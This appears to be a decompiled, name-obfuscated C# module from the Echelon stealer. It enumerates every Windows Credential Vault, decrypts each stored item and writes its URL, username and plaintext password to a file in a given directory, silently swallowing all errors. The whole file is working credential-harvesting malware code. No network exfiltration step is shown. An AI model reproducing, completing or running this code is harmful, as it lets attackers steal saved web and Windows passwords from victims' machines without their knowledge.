using Echelon;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

internal class y
{
	public static int a;

	public static void a(string fa)
	{
		try
		{
			DesktopWriter.SetDirectory(fa);
			Version version = Environment.OSVersion.Version;
			int major = version.Major;
			int minor = version.Minor;
			int fi = 0;
			IntPtr fj = IntPtr.Zero;
			int num = z.d(0, ref fi, ref fj);
			if (num != 0)
			{
				DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vaults. Error (0x" + num + ")"));
			}
			IntPtr ptr = fj;
			Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>
			{
				{
					new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
					"Windows Secure Note"
				},
				{
					new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
					"Windows Web Password Credential"
				},
				{
					new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
					"Windows Credential Picker Protector"
				},
				{
					new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
					"Web Credentials"
				},
				{
					new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
					"Windows Credentials"
				},
				{
					new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
					"Windows Domain Certificate Credential"
				},
				{
					new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
					"Windows Domain Password Credential"
				},
				{
					new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
					"Windows Extended Credential"
				},
				{
					new Guid("00000000-0000-0000-0000-000000000000"),
					null
				}
			};
			for (int i = 0; i < fi; i++)
			{
				object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
				Guid fc = new Guid(obj.ToString());
				ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
				IntPtr fe = IntPtr.Zero;
				string str = dictionary.ContainsKey(fc) ? dictionary[fc] : fc.ToString();
				num = z.a(ref fc, 0u, ref fe);
				if (num != 0)
				{
					DesktopWriter.WriteLine(string.Format("Unable to open the following vault: " + str + ". Error: 0x" + num));
				}
				int fm = 0;
				IntPtr fn = IntPtr.Zero;
				num = z.e(fe, 512, ref fm, ref fn);
				if (num != 0)
				{
					DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num));
				}
				IntPtr ptr2 = fn;
				if (fm > 0)
				{
					for (int j = 1; j <= fm; j++)
					{
						Type type = (major >= 6 && minor >= 2) ? typeof(z.c) : typeof(z.d);
						object obj2 = Marshal.PtrToStructure(ptr2, type);
						ptr2 = (IntPtr)(ptr2.ToInt64() + Marshal.SizeOf(type));
						IntPtr gc = IntPtr.Zero;
						FieldInfo field = obj2.GetType().GetField("SchemaId");
						Guid fx = new Guid(field.GetValue(obj2).ToString());
						IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement").GetValue(obj2);
						IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement").GetValue(obj2);
						_ = (ulong)obj2.GetType().GetField("LastModified").GetValue(obj2);
						IntPtr intPtr3 = IntPtr.Zero;
						if (major < 6 || minor < 2)
						{
							num = z.g(fe, ref fx, intPtr, intPtr2, IntPtr.Zero, 0, ref gc);
						}
						else
						{
							intPtr3 = (IntPtr)obj2.GetType().GetField("pPackageSid").GetValue(obj2);
							num = z.f(fe, ref fx, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref gc);
						}
						if (num != 0)
						{
							DesktopWriter.WriteLine(string.Format("Error occured while retrieving vault item. Error: 0x" + num));
						}
						object obj3 = Marshal.PtrToStructure(gc, type);
						object obj4 = b((IntPtr)obj3.GetType().GetField("pAuthenticatorElement").GetValue(obj3));
						object obj5 = null;
						if (intPtr3 != IntPtr.Zero)
						{
							obj5 = b(intPtr3);
						}
						if (obj4 != null)
						{
							object obj6 = b(intPtr);
							if (obj6 != null)
							{
								DesktopWriter.WriteLine($"Url: {obj6}");
							}
							object obj7 = b(intPtr2);
							if (obj7 != null)
							{
								DesktopWriter.WriteLine($"Username: {obj7}");
							}
							if (obj5 != null)
							{
								DesktopWriter.WriteLine($"PacakgeSid: {obj5}");
							}
							DesktopWriter.WriteLine($"Password: {obj4}\n\n");
							y.a++;
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	internal static object b(IntPtr fb)
	{
		object obj = Marshal.PtrToStructure(fb, typeof(z.e));
		object value = obj.GetType().GetField("Type").GetValue(obj);
		IntPtr ptr = (IntPtr)(fb.ToInt64() + 16);
		switch ((int)value)
		{
		case 7:
			return Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
		case 0:
		{
			object obj2 = Marshal.ReadByte(ptr);
			return (bool)obj2;
		}
		case 1:
			return Marshal.ReadInt16(ptr);
		case 2:
			return Marshal.ReadInt16(ptr);
		case 3:
			return Marshal.ReadInt32(ptr);
		case 4:
			return Marshal.ReadInt32(ptr);
		case 5:
			return Marshal.PtrToStructure(ptr, typeof(double));
		case 6:
			return Marshal.PtrToStructure(ptr, typeof(Guid));
		case 12:
			return new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
		default:
			return null;
		}
	}
}
